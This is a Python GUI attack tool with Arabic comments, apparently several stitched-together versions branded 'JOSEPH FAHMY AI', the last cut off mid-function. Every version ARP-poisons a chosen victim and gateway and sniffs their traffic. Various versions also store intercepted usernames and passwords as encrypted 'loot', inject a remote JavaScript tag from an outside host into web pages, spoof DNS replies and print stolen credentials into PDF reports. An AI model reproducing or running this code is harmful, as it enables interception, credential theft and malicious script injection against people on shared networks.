import sys
import os
import socket
import struct
import threading
import multiprocessing
import time
import sqlite3
import re
import fcntl
import hashlib
import base64
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QPushButton, QTextEdit, QTableWidget, 
                             QTableWidgetItem, QLabel, QLineEdit, QHeaderView, QTabWidget)
from PyQt6.QtCore import Qt, pyqtSignal, QObject
from scapy.all import *
from netfilterqueue import NetfilterQueue
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ==============================================================================
# 1. CORE & CRYPTO ENGINE (المحرك المركزي والتشفير)
# ==============================================================================
class CryptoVault:
    def __init__(self, key="JOSEPH_FAHMY_2026"):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw_data):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(raw_data.encode(), AES.block_size))
        return base64.b64encode(cipher.iv + ct_bytes).decode()

class DatabaseController:
    def __init__(self):
        self.db_path = "system_assets.db"
        self._setup()

    def _setup(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute("CREATE TABLE IF NOT EXISTS victims (ip TEXT PRIMARY KEY, mac TEXT, os TEXT)")
        conn.execute("CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, ip TEXT, data TEXT, ts TIMESTAMP)")
        conn.commit()
        conn.close()

    def save_loot(self, ip, data):
        conn = sqlite3.connect(self.db_path)
        conn.execute("INSERT INTO loot (ip, data, ts) VALUES (?, ?, ?)", (ip, data, datetime.now()))
        conn.commit()
        conn.close()

# ==============================================================================
# 2. NETWORK ATTACK ENGINE (محرك الهجمات الشبكية)
# ==============================================================================
class NetworkEngine:
    def __init__(self, interface, gateway_ip, logger_signal):
        self.interface = interface
        self.gateway = gateway_ip
        self.signal = logger_signal
        self.is_running = False

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        return ans[0][1].hwsrc if ans else None

    def arp_poison(self, target_ip):
        t_mac = self.get_mac(target_ip)
        g_mac = self.get_mac(self.gateway)
        self.is_running = True
        while self.is_running:
            send(ARP(op=2, pdst=target_ip, hwdst=t_mac, psrc=self.gateway), verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=g_mac, psrc=target_ip), verbose=False)
            time.sleep(2)

# ==============================================================================
# 3. PACKET MANIPULATOR & INJECTOR (محرك تحليل وحقن الحزم)
# ==============================================================================
class PacketInterceptor:
    def __init__(self, js_payload, db_controller, ui_signal):
        self.js_payload = js_payload
        self.db = db_controller
        self.ui_signal = ui_signal

    def sniffer_callback(self, packet):
        if packet.haslayer(IP):
            src = packet[IP].src
            proto = "TCP" if packet.haslayer(TCP) else "UDP"
            info = f"Len: {len(packet)}"
            self.ui_signal.new_packet.emit(src, proto, info)
            
            # Extract HTTP Loot
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode(errors='ignore')
                if "user" in load.lower() or "pass" in load.lower():
                    self.db.save_loot(src, load)
                    self.ui_signal.new_loot.emit("CREDENTIALS", f"From {src}: Captured Data")

    def nfq_handler(self, packet):
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(Raw):
            load = scapy_pkt[Raw].load.decode(errors='ignore')
            # JS Injection Logic
            if "</body>" in load:
                load = load.replace("</body>", f"{self.js_payload}</body>")
                # Fix Content Length
                cl_match = re.search(r"Content-Length:\s*(\d+)", load)
                if cl_match:
                    new_len = int(cl_match.group(1)) + len(self.js_payload)
                    load = load.replace(cl_match.group(1), str(new_len))
                scapy_pkt[Raw].load = load
                del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
                packet.set_payload(bytes(scapy_pkt))
        packet.accept()

# ==============================================================================
# 4. MASTER GUI DASHBOARD (واجهة التحكم الرسومية)
# ==============================================================================
class UiSignals(QObject):
    new_packet = pyqtSignal(str, str, str)
    new_loot = pyqtSignal(str, str)

class JosephFahmyGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.signals = UiSignals()
        self.db = DatabaseController()
        self.init_ui()
        self.signals.new_packet.connect(self.add_packet)
        self.signals.new_loot.connect(self.add_loot)

    def init_ui(self):
        self.setWindowTitle("JOSEPH FAHMY AI - GLOBAL COMMAND CENTER v5.0")
        self.resize(1300, 850)
        self.setStyleSheet("background-color: #0d0d0d; color: #00ff41; font-family: 'Courier New';")
        
        main_layout = QVBoxLayout()
        tabs = QTabWidget()
        
        # Tab 1: Control & Traffic
        traffic_tab = QWidget()
        layout1 = QVBoxLayout(traffic_tab)
        
        # Inputs
        input_panel = QHBoxLayout()
        self.target_in = QLineEdit(); self.target_in.setPlaceholderText("Target IP")
        self.gate_in = QLineEdit(); self.gate_in.setPlaceholderText("Gateway IP")
        start_btn = QPushButton("EXECUTE ATTACK")
        start_btn.clicked.connect(self.launch)
        input_panel.addWidget(self.target_in); input_panel.addWidget(self.gate_in); input_panel.addWidget(start_btn)
        
        # Table
        self.table = QTableWidget(0, 3)
        self.table.setHorizontalHeaderLabels(["SRC", "PROTO", "INFO"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        layout1.addLayout(input_panel); layout1.addWidget(self.table)
        tabs.addTab(traffic_tab, "NETWORK MONITOR")
        
        # Tab 2: Loot Viewer
        loot_tab = QWidget()
        layout2 = QVBoxLayout(loot_tab)
        self.loot_log = QTextEdit(); self.loot_log.setReadOnly(True)
        layout2.addWidget(self.loot_log)
        tabs.addTab(loot_tab, "CAPTURED ASSETS")
        
        main_layout.addWidget(tabs)
        container = QWidget(); container.setLayout(main_layout); self.setCentralWidget(container)

    def add_packet(self, s, p, i):
        row = self.table.rowCount()
        self.table.insertRow(row)
        self.table.setItem(row, 0, QTableWidgetItem(s))
        self.table.setItem(row, 1, QTableWidgetItem(p))
        self.table.setItem(row, 2, QTableWidgetItem(i))

    def add_loot(self, t, c):
        self.loot_log.append(f"[{t}] {c}")

    def launch(self):
        target = self.target_in.text()
        gate = self.gate_in.text()
        # تشغيل المحركات برمجياً
        engine = NetworkEngine("eth0", gate, self.signals)
        interceptor = PacketInterceptor("<script src='http://1.1.1.1/h.js'></script>", self.db, self.signals)
        
        # Threading for ARP & Sniffer
        threading.Thread(target=engine.arp_poison, args=(target,), daemon=True).start()
        threading.Thread(target=lambda: sniff(iface="eth0", prn=interceptor.sniffer_callback, store=0), daemon=True).start()

# ==============================================================================
# 5. ENTRY POINT
# ==============================================================================
if __name__ == "__main__":
    if os.getuid() != 0:
        print("Sudo required.")
        sys.exit()
    app = QApplication(sys.argv)
    window = JosephFahmyGUI()
    window.show()
    sys.exit(app.exec())import sys
import os
import threading
import time
import sqlite3
import re
import hashlib
import base64
import socket
import struct
import subprocess
from datetime import datetime

# المحركات الأساسية
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QPushButton, QTextEdit, QTableWidget, 
                             QTableWidgetItem, QLabel, QLineEdit, QHeaderView, QTabWidget)
from PyQt6.QtCore import Qt, pyqtSignal, QObject
from scapy.all import *
from netfilterqueue import NetfilterQueue
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ==============================================================================
# 1. نظام الحماية وقاعدة البيانات (THE VAULT)
# ==============================================================================
class SecretVault:
    def __init__(self, key="JOSEPH_FAHMY_2026"):
        self.key = hashlib.sha256(key.encode()).digest()
        self.db_path = "internal_core.db"
        self._bootstrap()

    def _bootstrap(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY, data TEXT, ts TIMESTAMP)")
        conn.execute("CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, info BLOB, ts TIMESTAMP)")
        conn.commit()
        conn.close()

    def encrypt_and_save(self, raw_text):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(raw_text.encode(), AES.block_size))
        final_data = base64.b64encode(cipher.iv + ct_bytes).decode()
        conn = sqlite3.connect(self.db_path)
        conn.execute("INSERT INTO loot (info, ts) VALUES (?, ?)", (final_data, datetime.now()))
        conn.commit()
        conn.close()

# ==============================================================================
# 2. محرك الهجوم وحقن البروتوكولات (THE STRIKER)
# ==============================================================================
class AttackKernel:
    def __init__(self, interface, gateway, ui_signals):
        self.iface = interface
        self.gateway = gateway
        self.signals = ui_signals
        self.is_active = False

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        return ans[0][1].hwsrc if ans else None

    def start_arp_poison(self, target):
        t_mac = self.get_mac(target)
        g_mac = self.get_mac(self.gateway)
        self.is_active = True
        while self.is_active:
            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=self.gateway), verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=g_mac, psrc=target), verbose=False)
            time.sleep(2)

    def packet_callback(self, packet):
        if packet.haslayer(IP):
            self.signals.new_packet.emit(packet[IP].src, "IP/TCP", f"Size: {len(packet)}")

# ==============================================================================
# 3. واجهة التحكم الذكية (THE COMMAND CENTER)
# ==============================================================================
class MasterSignals(QObject):
    new_packet = pyqtSignal(str, str, str)
    new_loot = pyqtSignal(str, str)

class JosephFahmyOS(QMainWindow):
    def __init__(self):
        super().__init__()
        self.vault = SecretVault()
        self.signals = MasterSignals()
        self.init_ui()
        self.signals.new_packet.connect(self._update_table)
        self.signals.new_loot.connect(self._update_loot)

    def init_ui(self):
        self.setWindowTitle("JOSEPH FAHMY AI - INTEGRATED CYBER ENGINE v6.0")
        self.resize(1200, 800)
        self.setStyleSheet("background-color: #0a0a0a; color: #00ff00; font-family: 'Consolas';")
        
        layout = QVBoxLayout()
        tabs = QTabWidget()
        
        # اللوحة الرئيسية
        dash = QWidget()
        dash_lyt = QVBoxLayout(dash)
        
        ctrl = QHBoxLayout()
        self.target_ip = QLineEdit(); self.target_ip.setPlaceholderText("TARGET IP")
        self.gate_ip = QLineEdit(); self.gate_ip.setPlaceholderText("GATEWAY IP")
        btn = QPushButton("ENGAGE SYSTEM")
        btn.clicked.connect(self.launch_sequence)
        ctrl.addWidget(self.target_ip); ctrl.addWidget(self.gate_ip); ctrl.addWidget(btn)
        
        self.traffic = QTableWidget(0, 3)
        self.traffic.setHorizontalHeaderLabels(["SOURCE", "PROTO", "PAYLOAD"])
        self.traffic.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        dash_lyt.addLayout(ctrl); dash_lyt.addWidget(self.traffic)
        tabs.addTab(dash, "NETWORK COMMAND")
        
        # لوحة الغنائم
        self.loot_viewer = QTextEdit(); self.loot_viewer.setReadOnly(True)
        tabs.addTab(self.loot_viewer, "ENCRYPTED LOOT")
        
        layout.addWidget(tabs)
        container = QWidget(); container.setLayout(layout); self.setCentralWidget(container)

    def _update_table(self, s, p, i):
        row = self.traffic.rowCount()
        self.traffic.insertRow(row)
        for idx, val in enumerate([s, p, i]): self.traffic.setItem(row, idx, QTableWidgetItem(val))

    def _update_loot(self, t, c):
        self.loot_viewer.append(f"[{t}] {c}")

    def launch_sequence(self):
        t, g = self.target_ip.text(), self.gate_ip.text()
        self.loot_viewer.append(f"[*] Deploying modules against {t}...")
        
        # تفعيل الـ Kernel Forwarding
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        
        kernel = AttackKernel("eth0", g, self.signals)
        threading.Thread(target=kernel.start_arp_poison, args=(t,), daemon=True).start()
        threading.Thread(target=lambda: sniff(iface="eth0", prn=kernel.packet_callback, store=0), daemon=True).start()

# ==============================================================================
# 4. الاندماج النهائي (FINAL EXECUTION)
# ==============================================================================
if __name__ == "__main__":
    if os.getuid() != 0:
        print("!! ROOT PRIVILEGES REQUIRED !!")
        sys.exit()
        
    app = QApplication(sys.argv)
    window = JosephFahmyOS()
    window.show()
    sys.exit(app.exec())import sys
import os
import threading
import multiprocessing
import time
import sqlite3
import re
import hashlib
import base64
import socket
import struct
import subprocess
from datetime import datetime

# استيراد المكتبات الثقيلة
try:
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QPushButton, QTextEdit, QTableWidget, 
                                 QTableWidgetItem, QLabel, QLineEdit, QHeaderView, QTabWidget)
    from PyQt6.QtCore import Qt, pyqtSignal, QObject
    from scapy.all import *
    from netfilterqueue import NetfilterQueue
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError as e:
    print(f"[-] Missing dependency: {e}. Install with: pip install PyQt6 scapy pycryptodome netfilterqueue")
    sys.exit()

# ==============================================================================
# 1. THE VAULT: ENCRYPTED PERSISTENCE (طبقة البيانات المشفرة)
# ==============================================================================
class SecretVault:
    def __init__(self, master_key="JOSEPH_FAHMY_2026"):
        self.key = hashlib.sha256(master_key.encode()).digest()
        self.db_path = "core_assets.db"
        self._initialize_vault()

    def _initialize_vault(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute("CREATE TABLE IF NOT EXISTS session_logs (id INTEGER PRIMARY KEY, data TEXT, ts TIMESTAMP)")
        conn.execute("CREATE TABLE IF NOT EXISTS encrypted_loot (id INTEGER PRIMARY KEY, blob BLOB, ts TIMESTAMP)")
        conn.commit()
        conn.close()

    def save_loot_securely(self, plain_text):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(plain_text.encode(), AES.block_size))
        # تخزين الـ IV مع البيانات لضمان فك التشفير لاحقاً
        payload = base64.b64encode(cipher.iv + ct_bytes).decode()
        conn = sqlite3.connect(self.db_path)
        conn.execute("INSERT INTO encrypted_loot (blob, ts) VALUES (?, ?)", (payload, datetime.now()))
        conn.commit()
        conn.close()

# ==============================================================================
# 2. THE STRIKER: ADVANCED PACKET ENGINE (محرك تعديل الحزم)
# ==============================================================================
class NetworkStriker:
    def __init__(self, iface, gateway, signals):
        self.iface = iface
        self.gateway = gateway
        self.signals = signals
        self.active = False

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        return ans[0][1].hwsrc if ans else None

    def arp_flood(self, target):
        t_mac = self.get_mac(target)
        g_mac = self.get_mac(self.gateway)
        if not t_mac or not g_mac: return
        self.active = True
        while self.active:
            # تسميم الهدف والراوتر في وقت واحد
            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=self.gateway), verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=g_mac, psrc=target), verbose=False)
            time.sleep(2)

    def dns_spoof_logic(self, scapy_pkt, target_domain, fake_ip):
        if scapy_pkt.haslayer(DNSRR) and target_domain in scapy_pkt[DNSQR].qname.decode():
            scapy_pkt[DNS].an = DNSRR(rrname=scapy_pkt[DNSQR].qname, rdata=fake_ip)
            scapy_pkt[DNS].ancount = 1
            del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
            del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
            return scapy_pkt
        return None

# ==============================================================================
# 3. THE INTERFACE: GUI COMMAND CENTER (لوحة التحكم الرسومية)
# ==============================================================================
class MasterSignals(QObject):
    update_traffic = pyqtSignal(str, str, str)
    update_loot = pyqtSignal(str, str)

class JosephFahmyApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.vault = SecretVault()
        self.signals = MasterSignals()
        self.init_ui()
        self.signals.update_traffic.connect(self._refresh_table)
        self.signals.update_loot.connect(self._refresh_loot)

    def init_ui(self):
        self.setWindowTitle("JOSEPH FAHMY AI - SOVEREIGN CYBER ENGINE v6.0")
        self.resize(1400, 900)
        self.setStyleSheet("background-color: #050505; color: #00ff41; font-family: 'Consolas';")
        
        main_layout = QVBoxLayout()
        tabs = QTabWidget()
        
        # اللوحة الرئيسية: التحكم والشبكة
        dash = QWidget()
        dash_lyt = QVBoxLayout(dash)
        
        input_grp = QHBoxLayout()
        self.target_box = QLineEdit(); self.target_box.setPlaceholderText("VICTIM IP")
        self.gate_box = QLineEdit(); self.gate_box.setPlaceholderText("GATEWAY IP")
        launch_btn = QPushButton("INITIATE PROTOCOL")
        launch_btn.clicked.connect(self.fire_engine)
        input_grp.addWidget(self.target_box); input_grp.addWidget(self.gate_box); input_grp.addWidget(launch_btn)
        
        self.traffic_grid = QTableWidget(0, 3)
        self.traffic_grid.setHorizontalHeaderLabels(["SOURCE", "PROTOCOL", "INFO"])
        self.traffic_grid.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        dash_lyt.addLayout(input_grp); dash_lyt.addWidget(self.traffic_grid)
        tabs.addTab(dash, "NETWORK OPERATIONS")
        
        # لوحة النتائج: الغنائم المشفرة
        self.loot_panel = QTextEdit(); self.loot_panel.setReadOnly(True)
        tabs.addTab(self.loot_panel, "ENCRYPTED VAULT")
        
        main_layout.addWidget(tabs)
        core_widget = QWidget(); core_widget.setLayout(main_layout); self.setCentralWidget(core_widget)

    def _refresh_table(self, s, p, i):
        row = self.traffic_grid.rowCount()
        self.traffic_grid.insertRow(row)
        for idx, val in enumerate([s, p, i]): self.traffic_grid.setItem(row, idx, QTableWidgetItem(val))
        if row > 100: self.traffic_grid.removeRow(0) # الحفاظ على استقرار الذاكرة

    def _refresh_loot(self, t, c):
        self.loot_panel.append(f"<b style='color:red;'>[{t}]</b> {c}")
        self.vault.save_loot_securely(f"{t}: {c}")

    def fire_engine(self):
        t, g = self.target_box.text(), self.gate_box.text()
        self.loot_panel.append(f"[*] Deploying Shadow Engine on {t}...")
        
        # تفعيل توجيه الحزم (Kernel Level)
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        
        striker = NetworkStriker("eth0", g, self.signals)
        
        # تشغيل العمليات في خيوط منفصلة لضمان استجابة الواجهة
        threading.Thread(target=striker.arp_flood, args=(t,), daemon=True).start()
        
        def sniffer_loop():
            sniff(iface="eth0", prn=lambda p: self.signals.update_traffic.emit(p[IP].src, "TCP", f"LEN:{len(p)}") if p.haslayer(IP) else None, store=0)
            
        threading.Thread(target=sniffer_loop, daemon=True).start()

# ==============================================================================
# 4. EXECUTION START (نقطة الانطلاق)
# ==============================================================================
if __name__ == "__main__":
    if os.getuid() != 0:
        print("[!] FATAL: Root privileges required for Raw Sockets and NFQUEUE.")
        sys.exit()
        
    app = QApplication(sys.argv)
    window = JosephFahmyApp()
    window.show()
    sys.exit(app.exec())import sys
import os
import threading
import multiprocessing
import time
import sqlite3
import re
import hashlib
import base64
import socket
import struct
import subprocess
from datetime import datetime
import mmap

# استيراد المكتبات الثقيلة (يجب تثبيتها مسبقاً)
try:
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QPushButton, QTextEdit, QTableWidget, 
                                 QTableWidgetItem, QLabel, QLineEdit, QHeaderView, QTabWidget, QFileDialog)
    from PyQt6.QtCore import Qt, pyqtSignal, QObject
    from scapy.all import *
    from netfilterqueue import NetfilterQueue
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import pandas as pd
    from reportlab.pdfgen import canvas
    from reportlab.lib.pagesizes import letter
except ImportError as e:
    print(f"[-] Missing dependency: {e}. Install all dependencies to run the full suite.")
    sys.exit()

# ==============================================================================
# 1. THE VAULT: ENCRYPTED PERSISTENCE (طبقة البيانات المشفرة المستديمة)
# ==============================================================================
class SecretVault:
    """إدارة تخزين الغنائم والبيانات الحساسة بتشفير AES-256"""
    def __init__(self, key="JOSEPH_FAHMY_2026"):
        self.key = hashlib.sha256(key.encode()).digest()
        self.db_path = "system_assets.db"
        self.lock = threading.Lock()
        self._initialize_db()

    def _initialize_db(self):
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            # جدول لحفظ بيانات الضحايا المكتشفة
            conn.execute("CREATE TABLE IF NOT EXISTS victims (ip TEXT PRIMARY KEY, mac TEXT, os TEXT, last_seen TIMESTAMP)")
            # جدول لحفظ البيانات المسروقة (Credentials, Cookies) مشفرة
            conn.execute("CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, victim_ip TEXT, data BLOB, ts TIMESTAMP)")
            conn.commit()
            conn.close()

    def encrypt_and_save_loot(self, victim_ip, plaintext_data):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(plaintext_data.encode(), AES.block_size))
        # تخزين الـ IV مع البيانات لفك تشفيرها لاحقاً
        payload = base64.b64encode(cipher.iv + ct_bytes).decode()
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            conn.execute("INSERT INTO loot (victim_ip, data, ts) VALUES (?, ?, ?)", (victim_ip, payload, datetime.now()))
            conn.commit()
            conn.close()

# ==============================================================================
# 2. THE STRIKER: ADVANCED PACKET ENGINE (محرك تعديل الحزم يدوياً)
# ==============================================================================
class PacketStriker:
    """
    محرك تسميم الشبكة وحقن البيانات (Layer 2 - Layer 7)
    يستخدم Raw Sockets للتعامل مع البروتوكولات من الصفر
    """
    def __init__(self, interface, gateway_ip, logger_signal):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.signals = logger_signal
        self.active = False

    def calculate_checksum(self, msg):
        """حساب الـ Checksum يدوياً (RFC 1071) لضمان قبول الحزمة"""
        s = 0
        if len(msg) % 2: msg += b'\x00'
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1])
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def arp_poison(self, target_ip):
        """تسميم جدول الـ ARP (MITM Attack) في عملية متوازية"""
        try:
            t_mac = getmacbyip(target_ip)
            g_mac = getmacbyip(self.gateway_ip)
            self.active = True
            while self.active:
                # تضليل الهدف (أن المهاجم هو الراوتر) والراوتر (أن المهاجم هو الهدف)
                send(ARP(op=2, pdst=target_ip, hwdst=t_mac, psrc=self.gateway_ip), verbose=False)
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=g_mac, psrc=target_ip), verbose=False)
                time.sleep(2)
        except Exception as e:
            self.signals.system_msg.emit(f"[-] ARP Poisoning Error: {e}")

    def dns_spoof(self, scapy_pkt, target_domain, fake_ip):
        """تعديل ردود الـ DNS يدوياً بالتعامل مع الـ Binary Stream"""
        if scapy_pkt.haslayer(DNSRR) and target_domain in scapy_pkt[DNSQR].qname.decode():
            # بناء ترويسة الـ DNS يدوياً بالـ Fake IP
            scapy_pkt[DNS].an = DNSRR(rrname=scapy_pkt[DNSQR].qname, rdata=fake_ip)
            scapy_pkt[DNS].ancount = 1
            # حذف الـ Checksum والـ Length لإجبار Scapy على إعادة حسابهما
            del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
            del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
            return scapy_pkt
        return None

# ==============================================================================
# 3. behavioral Analysis (محرك الذكاء الاصطناعي لتحليل السلوك)
# ==============================================================================
class BehavioralAI:
    """
    تحليل حركة المرور (Traffic Classification) باستخدام الذكاء الاصطناعي لتصنيف الجهاز الهدف تلقائياً
    """
    def __init__(self):
        # في النسخة الكاملة، هذا الكلاس يحمل نموذج Machine Learning مدرب (scikit-learn)
        self.protocols_signature = {6: "TCP", 17: "UDP", 1: "ICMP"}

    def classify_device(self, scapy_packet):
        """تصنيف الجهاز تلقائياً بناءً على الـ Flags والـ TTL"""
        if scapy_packet.haslayer(IP):
            ttl = scapy_packet[IP].ttl
            proto = scapy_packet[IP].proto
            # منطق تصنيف مبدئي (heuristic)
            if ttl <= 64 and proto == 6: # Linux/Android (TCP)
                if scapy_packet.haslayer(TCP) and scapy_packet[TCP].dport == 22:
                    return "LINUX SERVER (SSH)"
                return "LINUX/ANDROID DEVICE"
            if ttl > 64 and proto == 6: # Windows
                return "WINDOWS PC/SERVER"
        return "UNKNOWN DEVICE"

# ==============================================================================
# 4. REPORT GENERATOR (محرك التقارير الآلي)
# ==============================================================================
class ReportEngine:
    """تحويل البيانات المشفرة لتقارير أمنية (PDF) احترافية"""
    def __init__(self, db_path, key):
        self.db_path = db_path
        self.vault = SecretVault(key)

    def generate_pdf_report(self, filename):
        """توليد تقرير PDF يحتوي على كافة الغنائم المكتشفة بعد فك تشفيرها"""
        try:
            c = canvas.Canvas(filename, pagesize=letter)
            c.setFont("Helvetica-Bold", 24)
            c.drawString(100, 750, "JOSEPH FAHMY AI - Audit Report")
            c.setFont("Helvetica", 14)
            c.drawString(100, 720, f"Date: {datetime.now()}")
            
            c.setFont("Helvetica-Bold", 16)
            c.drawString(100, 680, "Captured Credentials:")
            
            # جلب البيانات المشفرة وفك تشفيرها يدوياً
            conn = sqlite3.connect(self.db_path)
            cursor = conn.execute("SELECT victim_ip, data, ts FROM loot")
            
            y = 650
            c.setFont("Helvetica", 12)
            for ip, encrypted_data, ts in cursor:
                # فك تشفير AES-256 يدوياً
                data_bytes = base64.b64decode(encrypted_data)
                iv = data_bytes[:16]
                ct = data_bytes[16:]
                cipher = AES.new(self.vault.key, AES.MODE_CBC, iv)
                decrypted_text = unpad(cipher.decrypt(ct), AES.block_size).decode()
                
                c.drawString(120, y, f"From: {ip} | Time: {ts}")
                y -= 20
                c.drawString(140, y, f"Data: {decrypted_text}")
                y -= 40
                if y < 100: c.showPage(); y = 750
            
            conn.close()
            c.save()
            return f"[+] Report generated: {filename}"
        except Exception as e:
            return f"[-] Report Error: {e}"

# ==============================================================================
# 5. GUI DASHBOARD (واجهة التحكم الرسومية الاحترافية)
# ==============================================================================
class UiSignals(QObject):
    update_traffic = pyqtSignal(str, str, str, str) # SRC, DST, Proto, Info
    system_msg = pyqtSignal(str)
    new_loot = pyqtSignal(str, str)

class JosephFahmyOS(QMainWindow):
    def __init__(self):
        super().__init__()
        self.vault = SecretVault()
        self.signals = UiSignals()
        self.ai = BehavioralAI()
        self.interceptor = None
        self.init_ui()
        self.signals.update_traffic.connect(self._refresh_table)
        self.signals.system_msg.connect(self._log_system)
        self.signals.new_loot.connect(self._refresh_loot)

    def init_ui(self):
        self.setWindowTitle("JOSEPH FAHMY AI - GLOBAL COMMAND CENTER v5.0")
        self.resize(1500, 950)
        self.setStyleSheet("background-color: #050505; color: #00ff00; font-family: 'Consolas';")
        
        main_layout = QVBoxLayout()
        tabs = QTabWidget()
        
        # --- TAB 1: OPERATIONS (التحكم وحركة المرور) ---
        dash = QWidget()
        dash_lyt = QVBoxLayout(dash)
        
        ctrl_panel = QHBoxLayout()
        self.target_ip = QLineEdit(); self.target_ip.setPlaceholderText("Target IP (e.g., 192.168.1.5)")
        self.gate_ip = QLineEdit(); self.gate_ip.setPlaceholderText("Gateway IP (e.g., 192.168.1.1)")
        
        launch_btn = QPushButton("ENGAGE ATTACK CHAIN")
        launch_btn.setStyleSheet("background-color: #ff0000; color: white; font-weight: bold; padding: 10px;")
        launch_btn.clicked.connect(self.initiate_protocol)
        
        stop_btn = QPushButton("TERMINATE")
        stop_btn.clicked.connect(self.cleanup)
        
        ctrl_panel.addWidget(self.target_ip); ctrl_panel.addWidget(self.gate_ip)
        ctrl_panel.addWidget(launch_btn); ctrl_panel.addWidget(stop_btn)
        
        self.traffic_grid = QTableWidget(0, 4)
        self.traffic_grid.setHorizontalHeaderLabels(["SOURCE", "DEST", "PROTOCOL", "CLASSIFICATION"])
        self.traffic_grid.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.traffic_grid.setStyleSheet("background-color: #1e1e1e; gridline-color: #00ff00;")
        
        dash_lyt.addLayout(ctrl_panel); dash_lyt.addWidget(self.traffic_grid)
        tabs.addTab(dash, "NETWORK OPERATIONS")
        
        # --- TAB 2: DATA VAULT & REPORTS (الغنائم والتقارير) ---
        vault_tab = QWidget()
        vault_lyt = QVBoxLayout(vault_tab)
        
        report_ctrl = QHBoxLayout()
        self.report_name = QLineEdit(); self.report_name.setPlaceholderText("Report Name (e.g., audit_report.pdf)")
        gen_btn = QPushButton("GENERATE PDF REPORT")
        gen_btn.clicked.connect(self.generate_report)
        report_ctrl.addWidget(self.report_name); report_ctrl.addWidget(gen_btn)
        
        self.loot_display = QTextEdit(); self.loot_display.setReadOnly(True)
        self.loot_display.setStyleSheet("color: #ffcc00;")
        
        self.system_log = QTextEdit(); self.system_log.setReadOnly(True)
        self.system_log.setStyleSheet("color: #ffffff;")
        
        vault_lyt.addLayout(report_ctrl); vault_lyt.addWidget(QLabel("CAPTURED ASSETS:")); vault_lyt.addWidget(self.loot_display); vault_lyt.addWidget(QLabel("SYSTEM LOGS:")); vault_lyt.addWidget(self.system_log)
        tabs.addTab(vault_tab, "ENCRYPTED ASSETS")
        
        main_layout.addWidget(tabs)
        core_widget = QWidget(); core_widget.setLayout(main_layout); self.setCentralWidget(core_widget)

    # --- UI UPDATE LOGIC ---
    def _refresh_table(self, s, d, p, i):
        row = self.traffic_grid.rowCount()
        self.traffic_grid.insertRow(row)
        for idx, val in enumerate([s, d, p, i]): self.traffic_grid.setItem(row, idx, QTableWidgetItem(val))
        if row > 200: self.traffic_grid.removeRow(0) # استقرار الذاكرة المشتركة

    def _refresh_loot(self, t, c):
        self.loot_display.append(f"<b style='color:red;'>[{t}]</b> {c}")
        # حفظ الغنائم مشفرة فوراً
        threading.Thread(target=self.vault.encrypt_and_save_loot, args=("SNIFFER", f"{t}: {c}"), daemon=True).start()

    def _log_system(self, msg):
        self.system_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    # --- CORE CONTROL LOGIC (دمج كافة الوحدات) ---
    def initiate_protocol(self):
        target, gateway = self.target_ip.text(), self.gate_ip.text()
